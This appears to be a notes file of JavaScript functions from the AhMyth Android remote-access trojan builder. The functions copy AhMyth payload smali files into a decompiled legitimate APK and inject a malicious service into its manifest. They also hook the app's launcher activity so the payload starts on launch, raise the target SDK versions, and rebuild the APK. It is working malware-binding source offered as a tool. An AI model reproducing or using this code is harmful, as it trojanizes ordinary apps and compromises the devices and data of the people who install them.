# Smali Payload Directory Creation Function 
```js
$appCtrl.CopyAhmythFilesAndGenerateApk = (apkFolder) => {

    $appCtrl.Log("Reading the Decompiled APK folder...");
    $appCtrl.Log();
    fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
        if (error) {
            $appCtrl.Log('Reading the Decompiled APK Failed!')
            $appCtrl.Log();
            return;

        } else {

            $appCtrl.Log("Sorting the List of Smali Directories...")
            $appCtrl.Log();
            var ignoreDirs = ['original', 'res', 'build', 'kotlin'];
            var smaliList = files
                .filter((item) => item.isDirectory() +
                !(ignoreDirs.includes(item.name)))
                .map((item) => item.name)
            var collator = Intl.Collator([], {numeric: true});
            smaliList.sort((a, b) => collator.compare(a, b));
            var lastSmali = smaliList[smaliList.length -1];
            if (lastSmali == "smali") {
                var payloadSmaliFolder = '/smali_classes2';
                $appCtrl.Log('Creating the new Smali Payload Directory...')
                $appCtrl.Log();
                fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
                    if (error) {
                        $appCtrl.Log("Unable to Create the Smali Payload Directory!");
                        $appCtrl.Log();
                        return;
                    };

                    $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
                    $appCtrl.Log();
                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali_classes2"), (error) => {
                        if (error) {
                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log();
                            fs.mkdir(logPath);
                            fs.writeFile(path.join(logPath, 'Copying.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                            $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                            $appCtrl.Log();
                            return;
                        }
                
                        $appCtrl.GenerateApk(apkFolder);
                    });

                });

            } else {

                var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
                var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
                var newSmaliNumber = lastSmaliNumber+1;
                var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
                $appCtrl.Log('Creating the new Smali Payload Directory...')
                $appCtrl.Log();
                fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
                    if (error) {
                        $appCtrl.Log("Unable to Create the Smali Payload Directory!");
                        $appCtrl.Log();
                        return;
                    };
                    
                    $appCtrl.Log("Copying AhMyth Payload Files to Original App...");
                    $appCtrl.Log();
                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => {
                        if (error) {
                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log();
                            fs.mkdir(logPath);
                            fs.writeFile(path.join(logPath, 'Copying.log'), `Copy and paste this error to github\n\n\`\`\`shell\n${error}\`\`\``, 'utf8');
                            $appCtrl.Log('Error written to "Copying.log" on...', CONSTANTS.logStatus.INFO);
                            $appCtrl.Log(logPath, CONSTANTS.logStatus.INFO);
                            $appCtrl.Log();
                            return;
                        }
                
                        $appCtrl.GenerateApk(apkFolder);
                    });

                });

            };

        };

    });

};
```
```js
console.log("Reading the Decompiled APK folder...");
console.log();
fs.readdir(apkFolder, { withFileTypes: true }, (error, files) => {
    if (error) {
        console.log('Reading the Decompiled APK Failed!')
        console.log();
        return;
        
    } else {
        
        console.log("Sorting the List of Smali Subdirectories...");
        console.log();
        var ignoreDirs = ['original', 'res', 'build', 'kotlin'];
        var smaliList = files
            .filter((item) => item.isDirectory() +
            !(ignoreDirs.includes(item.name)))
            .map((item) => item.name)
        var collator = Intl.Collator([], {numeric: true});
        smaliList.sort((a, b) => collator.compare(a, b));
        var lastSmali = smaliList[smaliList.length -1];
        if (lastSmali == "smali") {
            console.log("Creating the new Smali Payload Subdirectory...");
            console.log();
            fs.mkdir(apkFolder + '/smali_classes2', { recursive: true }, (error) => {
                if (error) {
                    console.log("Unable to Create the Smali Payloload Subdirectory!");
                    console.log();
                    return;
                };
                
                console.log("Copying AhMyth Payload Files to Original Application...");
                console.log();
                fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, "smali_classes2"), (error) => { 
                    if (error) {
                        console.log('Copying Failed!');
                        console.log();
                        return;
                    };
                    
                });
                
            });

        } else {

            var extractSmaliNumber = lastSmali.match(/[a-zA-Z_]+|[0-9]+/g);
            var lastSmaliNumber = parseInt(extractSmaliNumber[1]);
            var newSmaliNumber = lastSmaliNumber+1;
            var payloadSmaliFolder = ('/smali_classes'+newSmaliNumber);
            console.log("Creating the new Smali Payload Subdirectory...");
            console.log();
            fs.mkdir(apkFolder + payloadSmaliFolder, { recursive: true }, error => {
                if (error) {
                    console.log("Unable to Create the Smali Payload Subdirectory!");
                    console.log();
                    return;
                };
                
                console.log("Copying AhMyth Payload Files to Original Application...");
                console.log();
                fs.copy(path.join(ahmythApkFolderPath, "smali"), path.join(apkFolder, payloadSmaliFolder), (error) => { 
                    if (error) {
                        console.log('Copying Failed!');
                        console.log();
                        return;
                    };
                    
                });

            });

        };

    };

});
```
# Backup Cross Platform Bind On Launch function
Stored just in case of problems with the original Cross platform bind on launch function
```js
$appCtrl.BindOnLauncher = (apkFolder) => {


    $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
    $appCtrl.Log();
    fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
        if (error) {
            $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
            $appCtrl.Log();
            return;
        }

        var launcherActivity = GetLauncherActivity(data, apkFolder);
        if (launcherActivity == -1) {
            $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
            $appCtrl.Log("Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);
            $appCtrl.Log();
            return;
        }

        var ahmythService = CONSTANTS.ahmythService;
        $appCtrl.Log('Modifying AndroidManifest.xml...');
        $appCtrl.Log();
        var permManifest = $appCtrl.copyPermissions(data);
        var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
        fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
            if (error) {
                $appCtrl.Log('Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
                $appCtrl.Log();          
                return;
            }
            
            if (process.platform === 'win32') {
                $appCtrl.Log("Locating Launcher Activity...")
                $appCtrl.Log();
                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                + ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
                var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                if (error !== null) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else if (!launcherPath) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else {
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                }

                $appCtrl.Log("Reading Launcher Activity...")
                $appCtrl.Log();
                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                        $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log();
                        return;
                        }

                        var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
 
                        var hook = CONSTANTS.hookPoint;
                        $appCtrl.Log("Modifiying Launcher Activity...");
                        $appCtrl.Log();
                        var output = data.replace(hook, startService);
                        fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                                $appCtrl.Log();
                                return;
                            }
                            
                            $appCtrl.Log("Determining Target SDK Version...");
                            $appCtrl.Log()
                            fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                              if (error) {
                                $appCtrl.Log("Reading the Manifest Target SDK Failed.")
                                $appCtrl.Log()
                                return;
                              }
                              
                              $appCtrl.Log("Modifying the Target SDK Version...");
                              $appCtrl.Log();
                              var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                              var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                              var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                              var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                              var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
                              fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                                if (error) {
                                    $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                    $appCtrl.Log();          
                                    return;
                                  }

                                  fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                    if (error) {
                                        $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                        $appCtrl.Log();
                                        return;
                                    }

                                    var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                    var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                    var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                    fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                      if (error) {
                                          $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                          $appCtrl.Log()
                                          return;
                                        }

                                        var regex = /[^/]+\//;
                                        var str = launcherPath;
                                        var m = str.replace(/\\/g, "/").match(regex);
            
                                        var smaliFolder = m[0];
            
                                        $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                        $appCtrl.Log();
                                        fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                            if (error) {
                                                $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                                $appCtrl.Log();
                                                return;
                                              }
                                              
                                              $appCtrl.GenerateApk(apkFolder);
                              
                                          });
                                          
                                      });
              
                                  });
              
                              });

                          });

                      });

                  });

              });

            } else {
                (process.platform === "linux" || process.platfrom === "darwin")
                $appCtrl.Log("Locating Launcher Activity...");
                $appCtrl.Log();
                exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                + ' -file | resolve-path -relative', { 'shell':'pwsh' }, (error, stdout, stderr) => {
                var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                if (error !== null) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else if (!launcherPath) {
                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                    $appCtrl.Log();
                    return;
                } else {
                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log();
                }

                $appCtrl.Log("Reading Launcher Activity...")
                $appCtrl.Log();
                fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                    if (error) {
                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                      $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
                        $appCtrl.Log();
                        return;
                    }

                    var startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
 
                    var hook = CONSTANTS.hookPoint;
                    $appCtrl.Log("Modifiying Launcher Activity...");
                    $appCtrl.Log();
                    var output = data.replace(hook, startService);
                    fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                        if (error) {
                            $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
                            $appCtrl.Log();
                            return;
                        }
                        
                        $appCtrl.Log("Determining Target SDK Version...");
                        $appCtrl.Log()
                        fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
                            if (error) {
                                $appCtrl.Log("Reading the Manifest Target SDK Failed.")
                                $appCtrl.Log()
                                return;
                            }


                            $appCtrl.Log("Modifying the Target SDK Version...");
                            $appCtrl.Log();
                            var compSdkVerRegex = /\b(compileSdkVersion=\s*")\d{1,2}"/;
                            var compSdkVerNameRegex = /\b(compileSdkVersionCodename=\s*")\d{1,2}"/;
                            var platVerCoRegex = /\b(platformBuildVersionCode=\s*")\d{1,2}"/;
                            var platVerNameRegex = /\b(platformBuildVersionName=\s*")\d{1,2}"/
                            var repXmlSdk = data.replace(compSdkVerRegex, "$122"+'"').replace(compSdkVerNameRegex, "$111"+'"').replace(platVerCoRegex, "$122"+'"').replace(platVerNameRegex, "$111"+'"');
                            fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), repXmlSdk, 'utf8', (error) => {
                            if (error) {
                                $appCtrl.Log('Modifying Manifest Target SDK Failed!', CONSTANTS.logStatus.FAIL);
                                $appCtrl.Log();          
                                return;
                                }

                                fs.readFile(path.join(apkFolder, 'apktool.yml'), 'utf8', (error, data) => {
                                if (error) {
                                    $appCtrl.Log("Reading the 'apktool.yml' Target SDK Failed!");
                                    $appCtrl.Log();
                                    return;
                                }

                                var minSdkRegex = /\b(minSdkVersion:\s*')\d{1,2}'/;
                                var tarSdkRegex = /\b(targetSdkVersion:\s*')\d{1,2}'/;
                                var repYmlSdk = data.replace(minSdkRegex, "$119'").replace(tarSdkRegex, "$122'");
                                fs.writeFile(path.join(apkFolder, 'apktool.yml'), repYmlSdk, 'utf8', (error) => {
                                    if (error) {
                                        $appCtl.Log("Modifying the 'apktool.yml' Target SDK Failed!")
                                        $appCtrl.Log()
                                        return;
                                    }

                                    var regex = /[^/]+\//;
                                    var str = launcherPath;
                                    var m = str.match(regex);

                                    var smaliFolder = m[0];
            
                                    $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                                    $appCtrl.Log();
                                    fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                        if (error) {
                                            $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
                                            $appCtrl.Log();
                                            return;
                                            }
                                            
                                            $appCtrl.GenerateApk(apkFolder);
                
                                            });;

                                        });

                                    });

                                });

                            });

                        });

                    });

                });

            };

        });

    });

};
```
